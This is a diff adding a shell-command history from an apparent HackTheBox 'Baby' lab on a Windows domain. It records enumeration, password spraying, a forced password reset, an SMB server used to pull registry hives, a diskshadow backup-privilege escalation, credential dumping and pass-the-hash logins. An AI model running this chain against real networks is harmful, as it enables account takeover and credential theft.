@@ -1,0 +1,192 @@
+[2026-02-06 16:24:52] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Baby
+[2026-02-06 16:24:55] [pane=%0] [CMD] ll
+[2026-02-06 16:24:59] [pane=%0] [CMD] cd logs
+[2026-02-06 16:25:00] [pane=%0] [CMD] ll
+[2026-02-06 16:25:03] [pane=%0] [CMD] cd ..
+[2026-02-06 16:26:26] [pane=%0] [CMD] ll
+[2026-02-06 16:27:33] [pane=%0] [CMD] cat ~/.ip
+[2026-02-06 17:14:42] [pane=%0] [CMD] echo export IP=10.129.234.71 > ~/.ip
+[2026-02-06 17:15:24] [pane=%0] [CMD] echo $IP
+[2026-02-06 17:19:57] [pane=%0] [CMD] mkdir -p nmap ffuf loot evidence bloodhound
+[2026-02-06 17:20:26] [pane=%0] [CMD] source ~/.ip
+[2026-02-06 17:20:33] [pane=%0] [CMD] echo $IP
+[2026-02-06 17:24:46] [pane=%0] [CMD] nmap -p- --min-rate 3000 -Pn -oA nmap/BabyAllPorts $IP
+[2026-02-06 17:27:50] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/BabyAllPorts.nmap  | cut -d/ -f1 | paste -sd,)
+[2026-02-06 17:27:55] [pane=%0] [CMD] echo $ports
+[2026-02-06 17:29:01] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/BabyServicesVersions.txt $IP
+[2026-02-06 17:44:42] [pane=%0] [CMD] ll nmap
+[2026-02-06 17:48:09] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-02-07 10:37:35] [pane=%0] [CMD] ll
+[2026-02-07 10:45:41] [pane=%0] [CMD] nxc smb $IP -u '' -h ''
+[2026-02-07 10:46:25] [pane=%0] [CMD] nxc smb baby.vl -u '' -p ''
+[2026-02-07 10:46:57] [pane=%0] [CMD] : #note null auth true on smb
+[2026-02-07 10:47:14] [pane=%0] [CMD] smbclient //$IP/ -N
+[2026-02-07 10:47:39] [pane=%0] [CMD] smbclient //10.129.234.71/ -N
+[2026-02-07 10:49:17] [pane=%0] [CMD] smbclient //10.129.234.71/ -U ''%''
+[2026-02-07 10:52:03] [pane=%0] [CMD] smbclient -L //$IP -U ''
+[2026-02-07 10:52:10] [pane=%0] [CMD] smbclient -L //$IP -U ''
+[2026-02-07 10:53:41] [pane=%0] [CMD] smbclient -L //$IP -N
+[2026-02-07 10:55:09] [pane=%0] [CMD] nxc smb baby.vl -u '' -p '' --shares
+[2026-02-07 10:55:55] [pane=%0] [CMD] nxc smb baby.vl -u '' -p '' --users
+[2026-02-07 10:56:09] [pane=%0] [CMD] nxc smb baby.vl -u '' -p '' --groups
+[2026-02-07 10:58:32] [pane=%0] [CMD] nxc smb baby.vl -u '' -p '' --pass-pol
+[2026-02-07 11:03:39] [pane=%0] [CMD] : #note nxc smb annon bind could not access shares, users, group, or password policies
+[2026-02-07 11:06:08] [pane=%0] [CMD] nxc ldap $IP -u '' -p '' --query "(sAMAccountName=Administrator)" ""
+[2026-02-07 11:07:23] [pane=%0] [CMD] rm -f /home/b7h30/.nxc/workspaces/default/ldap.db
+[2026-02-07 11:07:26] [pane=%0] [CMD] nxc
+[2026-02-07 11:07:29] [pane=%0] [CMD] nxc ldap $IP -u '' -p '' --query "(sAMAccountName=Administrator)" ""
+[2026-02-07 11:12:23] [pane=%0] [CMD] ldapsearch -x -H ldap://$IP -b "DC=baby,DC=vl" "(objectClass=user)" | grep sAMAccountName
+[2026-02-07 11:12:37] [pane=%0] [CMD] ll
+[2026-02-07 11:12:51] [pane=%0] [CMD] cd loot
+[2026-02-07 11:13:12] [pane=%0] [CMD] ldapsearch -x -H ldap://$IP -b "DC=baby,DC=vl" "(objectClass=user)" | grep sAMAccountName | tee users.txt
+[2026-02-07 11:13:18] [pane=%0] [CMD] cat users.txt
+[2026-02-07 11:13:27] [pane=%0] [CMD] vim users.txt
+[2026-02-07 11:17:58] [pane=%0] [CMD] : #note ldapsearch reveals users saved to user.txt
+[2026-02-07 11:19:29] [pane=%0] [CMD] smbclient -N -L //$IP
+[2026-02-07 11:20:29] [pane=%0] [CMD] smbclient -N -L //baby.vl
+[2026-02-07 11:28:34] [pane=%0] [CMD] ldapsearch -x -H ldap://$IP -b "DC=baby,DC=vl" "(objectClass=user)"
+[2026-02-07 11:30:28] [pane=%0] [CMD] ldapsearch -x -H ldap://$IP -b "DC=baby,DC=vl" "(objectClass=user)" | tee ldapUserInfo.txt
+[2026-02-07 11:30:30] [pane=%0] [CMD] ll
+[2026-02-07 11:31:21] [pane=%0] [CMD] cat ldapUserInfo.txt | grep password
+[2026-02-07 11:32:04] [pane=%0] [CMD] vim ldapUserInfo.txt
+[2026-02-07 11:33:45] [pane=%0] [CMD] ll
+[2026-02-07 11:33:50] [pane=%0] [CMD] vim ldapUserInfo.txt
+[2026-02-07 11:36:59] [pane=%0] [CMD] : #note ldapsearch searching output for password reveals teresa with a password of BabyStart123. 
+[2026-02-07 11:40:22] [pane=%0] [CMD] nxc smb $ip -u users.txt -p BabyStart123!
+[2026-02-07 11:40:52] [pane=%0] [CMD] nxc smb $IP -u users.txt -p BabyStart123!
+[2026-02-07 11:42:15] [pane=%0] [CMD] nxc smb $IP -u users.txt -p 'BabyStart123!'
+[2026-02-07 11:46:21] [pane=%0] [CMD] evil-winrm -i 10.129.232.75 -u teresa.bell -p 'BabyStart123!'
+[2026-02-07 11:46:54] [pane=%0] [CMD] evil-winrm -i $IP -u teresa.bell -p 'BabyStart123!'
+[2026-02-07 11:48:33] [pane=%0] [CMD] ll
+[2026-02-07 11:48:46] [pane=%0] [CMD] less ldapUserInfo.txt
+[2026-02-07 11:53:33] [pane=%0] [CMD] cat ldapUserInfo.txt | grep sAMAccountName
+[2026-02-07 11:59:21] [pane=%0] [CMD] nxc ldap $IP -u users.txt -p '' --asreproast asreproastOutput.txt
+[2026-02-07 12:00:46] [pane=%0] [CMD] ll
+[2026-02-07 12:01:07] [pane=%0] [CMD] nxc ldap $IP -u users.txt -p '' --asreproast output.txt
+[2026-02-07 12:01:10] [pane=%0] [CMD] ll
+[2026-02-07 12:05:13] [pane=%0] [CMD] impacket-GetNPUsers baby.vl/ -usersfile users.txt -dc-ip $IP -format hashcat -outputfile output.txt
+
+[2026-02-07 12:06:54] [pane=%0] [CMD] ldapsearch -x -H ldap://$IP -b "DC=baby,DC=vl" "(objectClass=*)" | tee ldapUserInfoAll.txt
+[2026-02-07 12:08:57] [pane=%0] [CMD] ll
+[2026-02-07 12:09:43] [pane=%0] [CMD] nxc ldap baby.vl -u '' -p '' --query "sAMAccountName=*)" ""
+[2026-02-07 12:10:30] [pane=%0] [CMD] nxc ldap baby.vl -u '' -p '' --query "(sAMAccountName=*)" ""
+[2026-02-07 12:11:50] [pane=%0] [CMD] nxc ldap baby.vl -u '' -p '' --query "(sAMAccountName=*)" "" | grep "Response"
+[2026-02-07 12:12:32] [pane=%0] [CMD] nxc ldap baby.vl -u '' -p '' --query "(sAMAccountName=*)" "" | grep "PrincipalName"
+[2026-02-07 12:13:21] [pane=%0] [CMD] nxc ldap baby.vl -u '' -p '' --users "(sAMAccountName=*)" "" | grep "PrincipalName"
+[2026-02-07 12:13:30] [pane=%0] [CMD] nxc ldap baby.vl -u '' -p '' --users
+[2026-02-07 12:13:46] [pane=%0] [CMD] cat users.txt
+[2026-02-07 12:14:40] [pane=%0] [CMD] nxc smb $IP -u Guest -p ''
+[2026-02-07 12:14:59] [pane=%0] [CMD] nxc ldap baby.vl -u '' -p '' --computers
+[2026-02-07 12:46:38] [pane=%0] [CMD] ll
+[2026-02-07 12:46:46] [pane=%0] [CMD] vim ldapUserInfo.txt
+[2026-02-07 12:49:30] [pane=%0] [CMD] cat ldapUserInfoAll.txt | grep Ian
+[2026-02-07 12:49:39] [pane=%0] [CMD] cat ldapUserInfoAll.txt | grep Caroline
+[2026-02-07 12:50:41] [pane=%0] [CMD] grep -RiP '(ian|car)'
+[2026-02-07 12:52:40] [pane=%0] [CMD] vim ldapUserInfo.txt 
+[2026-02-07 12:53:13] [pane=%0] [CMD] vim ldapUserInfoAll.txt 
+[2026-02-07 12:57:54] [pane=%0] [CMD] echo Ian.Walker >> users.txt
+[2026-02-07 12:58:15] [pane=%0] [CMD] echo Caroline.Robinson >> users.txt
+[2026-02-07 12:58:20] [pane=%0] [CMD] cat users.txt
+[2026-02-07 13:00:16] [pane=%0] [CMD] impacket-GetNPUsers baby.vl/ -usersfile users.txt -dc-ip $IP -format hashcat -outputfile output.txt
+
+[2026-02-07 13:01:41] [pane=%0] [CMD] cat ../nmap/BabyServicesVersions.txt
+[2026-02-07 13:02:22] [pane=%0] [CMD] nxc smb $IP -u users.txt -p 'BabyStart123!'
+[2026-02-07 13:03:15] [pane=%0] [CMD] rpcclient $IP -N
+[2026-02-07 13:03:23] [pane=%0] [CMD] rpcclient $IP 
+[2026-02-07 13:03:31] [pane=%0] [CMD] rpcclient $IP 
+[2026-02-07 13:03:41] [pane=%0] [CMD] rpcclient $IP 
+[2026-02-07 13:05:53] [pane=%0] [CMD] evil-winrm -i $IP -u Caroline.Robinson -p 'BabyStart123!'
+[2026-02-07 13:07:42] [pane=%0] [CMD] evil-winrm -i $IP -u Ian.Walker -p 'BabyStart123!'
+[2026-02-07 13:09:01] [pane=%0] [CMD] vim ldapUserInfoAll.txt 
+[2026-02-07 13:15:52] [pane=%0] [CMD] ll
+[2026-02-07 13:18:09] [pane=%0] [CMD] nxc smb $IP -u ian.walker -p 'BabyStart123!'
+[2026-02-07 13:18:36] [pane=%0] [CMD] nxc smb $IP -u caroline.robinson -p 'BabyStart123!'
+[2026-02-07 13:19:20] [pane=%0] [CMD] nxc smb baby.vl -u caroline.robinson -p 'BabyStart123!'
+[2026-02-07 13:19:33] [pane=%0] [CMD] nxc smb baby.vl -u ian.walker -p 'BabyStart123!'
+[2026-02-07 13:20:04] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!'
+[2026-02-07 13:20:16] [pane=%0] [CMD] nxc smb baby.vl -u Ian.Walker -p 'BabyStart123!'
+[2026-02-07 13:21:05] [pane=%0] [CMD] nxc smb baby.vl -u teresa.bell -p 'BabyStart123!'
+[2026-02-07 13:21:21] [pane=%0] [CMD] evil-winrm -i $IP -u teresa.bell -p 'BabyStart123!'
+[2026-02-07 13:23:50] [pane=%1] [CMD] ll
+[2026-02-07 13:24:01] [pane=%1] [CMD] cd -
+[2026-02-07 13:24:13] [pane=%1] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Baby
+[2026-02-07 13:24:14] [pane=%1] [CMD] dir
+[2026-02-07 13:24:15] [pane=%1] [CMD] ll
+[2026-02-07 13:24:22] [pane=%1] [CMD] cd loot
+[2026-02-07 13:24:23] [pane=%1] [CMD] ll
+[2026-02-07 13:24:27] [pane=%1] [CMD] cat users.txt
+[2026-02-07 13:25:53] [pane=%0] [CMD] grep "sAMAccountName:" ldapUserInfoAll.txt | grep
+  -vi "sAMAccountType" | awk '{print $2}' | sort -u
+[2026-02-07 13:26:04] [pane=%0] [CMD] grep "sAMAccountName:" ldapUserInfoAll.txt | grep -vi "sAMAccountType" | awk '{print $2}' | sort -u
+[2026-02-07 13:29:14] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-02-07 13:29:51] [pane=%0] [CMD] nxc smb baby.vl -u teresa.bell -p 'BabyStart123!'
+[2026-02-07 13:30:27] [pane=%0] [CMD] nxc smb baby.vl -u ian.walker -p 'BabyStart123!'
+[2026-02-07 13:30:45] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!'
+[2026-02-07 13:34:10] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-pasword -o NewPassword=Yourmoms123!
+[2026-02-07 13:35:02] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NewPassword=Yourmoms123!
+[2026-02-07 13:35:29] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=Yourmoms123!
+[2026-02-07 13:37:41] [pane=%0] [CMD] evil-winrm -i $IP -u Caroline.Robinson -p 'Yourmoms123!'
+[2026-02-07 13:38:44] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!'
+[2026-02-07 13:39:44] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' --shares
+[2026-02-07 13:42:13] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' --spider ADMIN\$
+[2026-02-07 13:42:28] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=Yourmoms123!
+[2026-02-07 13:44:05] [pane=%0] [CMD] nxc smb baby.vl -u Caroline.Robinson -p 'Yourmoms123!' --spider ADMIN\$
+[2026-02-07 13:47:21] [pane=%0] [CMD] smbmap -u 'caroline.robinson' -p 'Youmoms123!' -d baby.vl -H $IP -r | tee smbmapCarolineRobinson.txt
+[2026-02-07 13:49:51] [pane=%0] [CMD] smbmap -u 'caroline.robinson' -p 'Yourmoms123!' -d baby.vl -H $IP -r | tee smbmapCarolineRobinson.txt
+[2026-02-07 13:50:13] [pane=%0] [CMD] smbmap -u 'caroline.robinson' -p 'Yourmoms123!' -d baby.vl -H 10.129.234.71 -r | tee smbmapCarolineRobinson.txt
+[2026-02-07 13:50:41] [pane=%0] [CMD] smbmap -u 'caroline.robinson' -p 'Yourmoms123!' -d Baby.vl -H 10.129.234.71 -r | tee smbmapCarolineRobinson.txt
+[2026-02-07 13:52:03] [pane=%0] [CMD] nxc smb $IP -u 'caroline.robinson' -p 'Yourmoms123!' -M spider_plus
+[2026-02-07 14:02:40] [pane=%0] [CMD] smbclient -N -L //baby.vl -u 'carloline.robinson' -p 'Yourmoms123!'
+[2026-02-07 14:05:19] [pane=%0] [CMD] smbclient //$IP/ -u caroline.robinson
+[2026-02-07 14:05:26] [pane=%0] [CMD] smbclient //$IP/ -U caroline.robinson
+[2026-02-07 14:06:24] [pane=%0] [CMD] smbclient //$IP/ADMIN$ -U caroline.robinson
+[2026-02-07 14:07:59] [pane=%0] [CMD] cat /etc/hosts
+[2026-02-07 14:09:05] [pane=%0] [CMD] echo export IP=10.129.16.61 > ~/.ip
+[2026-02-07 14:09:10] [pane=%0] [CMD] source ~/.ip
+[2026-02-07 14:09:17] [pane=%0] [CMD] smbclient //$IP/ADMIN$ -U caroline.robinson
+[2026-02-07 14:11:22] [pane=%1] [CMD] ll
+[2026-02-07 14:11:31] [pane=%1] [CMD] strings lsasetup.log
+[2026-02-07 14:11:37] [pane=%1] [CMD] cat lsasetup.log
+[2026-02-07 14:22:02] [pane=%1] [CMD] ll
+[2026-02-07 14:22:06] [pane=%1] [CMD] cat WindowsShell.Manifest
+[2026-02-07 14:27:46] [pane=%1] [CMD] impacket-secretsdump -k baby.vl -k --sam
+[2026-02-07 14:27:52] [pane=%1] [CMD] impacket-secretsdump -k baby.vl -k 
+[2026-02-07 14:35:20] [pane=%1] [CMD] ll
+[2026-02-07 14:35:21] [pane=%1] [CMD] cd ..
+[2026-02-07 14:35:22] [pane=%1] [CMD] ll
+[2026-02-07 14:35:25] [pane=%1] [CMD] cd bloodhound
+[2026-02-07 14:37:07] [pane=%1] [CMD] bloodhound-python -u caroline.robinson -p 'Yourmoms123!' -d baby.vl -ns $IP --dns-tcp -c All --zip
+[2026-02-07 14:37:26] [pane=%1] [CMD] bloodhound-python -u caroline.robinson -p 'Yourmoms123!' -d baby.vl -ns 10.129.16.61 --dns-tcp -c All --zip
+[2026-02-07 14:37:46] [pane=%1] [CMD] echo $IP
+[2026-02-07 14:37:58] [pane=%1] [CMD] source ~/.ip
+[2026-02-07 14:38:00] [pane=%1] [CMD] echo $IP
+[2026-02-07 14:38:20] [pane=%1] [CMD] ll
+[2026-02-07 14:54:17] [pane=%0] [CMD] evil-winrm -i $IP -u Caroline.Robinson -p 'Yourmoms123!'
+[2026-02-07 14:54:27] [pane=%0] [CMD] evil-winrm -i $IP -u Caroline.Robinson -p 'Yourmoms123!'
+[2026-02-07 15:10:40] [pane=%1] [CMD] cd ../loot
+[2026-02-07 15:10:41] [pane=%1] [CMD] dir
+[2026-02-07 15:11:18] [pane=%1] [CMD] impacket-smbserver share /home/b7h30/Documents/obsidian/docs/CTF/HTB/Baby/loot -smb2support
+[2026-02-07 15:13:43] [pane=%1] [CMD] ll
+[2026-02-07 15:14:26] [pane=%1] [CMD] impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+[2026-02-07 15:14:33] [pane=%1] [CMD] impacket-secretsdump -sam SAM -system SYSTEM
+[2026-02-07 15:23:04] [pane=%1] [CMD] pypykatz registry --sam SAM SYSTEM
+[2026-02-07 15:23:58] [pane=%1] [CMD] evil-winrm -i $IP -u Administrator -H '8d992faed38128ae85e95fa35868bb43'
+[2026-02-07 15:24:59] [pane=%1] [CMD] evil-winrm -i $IP -u Administrator -h '8d992faed38128ae85e95fa35868bb43'
+[2026-02-07 15:26:35] [pane=%1] [CMD] impacket-smbserver share /home/b7h30/Documents/obsidian/docs/CTF/HTB/Baby/loot -smb2support
+[2026-02-07 15:28:32] [pane=%1] [CMD] smbserver.py loot . -smb2support -username theo -password theo
+[2026-02-07 15:34:42] [pane=%2] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/baby
+[2026-02-07 15:35:49] [pane=%2] [CMD] : #note after changing Caroline.robinson password. with nxc smb. we used evilwinrm to to login to the box and grab the user flag. 
+[2026-02-07 15:37:48] [pane=%2] [CMD] : #note caroline.robinson has SeBackupPrivilege and SeRestorePrivilege. so we can attempt backup operator privilege escalation. 
+[2026-02-07 15:39:32] [pane=%2] [CMD] : #note '*Evil-WinRM* PS C:\Users\Public> echo "set context persistent nowriters`nadd volume c: alias temp`ncreate`nexpose %temp% z:" > script.txt; diskshadow /s script.txt'
+[2026-02-07 15:46:54] [pane=%1] [CMD] vim backup
+[2026-02-07 15:47:54] [pane=%1] [CMD] unix2dos backup
+[2026-02-07 15:58:07] [pane=%1] [CMD] ll
+[2026-02-07 15:59:12] [pane=%1] [CMD] secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+[2026-02-07 16:00:08] [pane=%1] [CMD] : #note secretsdump.py command pulls the Admin hash ee4457ae59f1e3fbd764e33d9cef123d
+[2026-02-07 16:01:23] [pane=%1] [CMD] nxc smb $IP -u administrator -h 'ee4457ae59f1e3fbd764e33d9cef123d'
+[2026-02-07 16:01:48] [pane=%1] [CMD] nxc smb $IP -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
+[2026-02-07 16:02:08] [pane=%1] [CMD] evil-winrm -i $IP -u Administrator -h 'ee4457ae59f1e3fbd764e33d9cef123d'
+[2026-02-07 16:03:10] [pane=%1] [CMD] evil-winrm -i $IP -u Administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
+[2026-02-11 05:53:09] [pane=%2] [CMD] exit
+[2026-02-11 05:53:19] [pane=%1] [CMD] exit
+[2026-02-11 05:53:25] [pane=%0] [CMD] exit
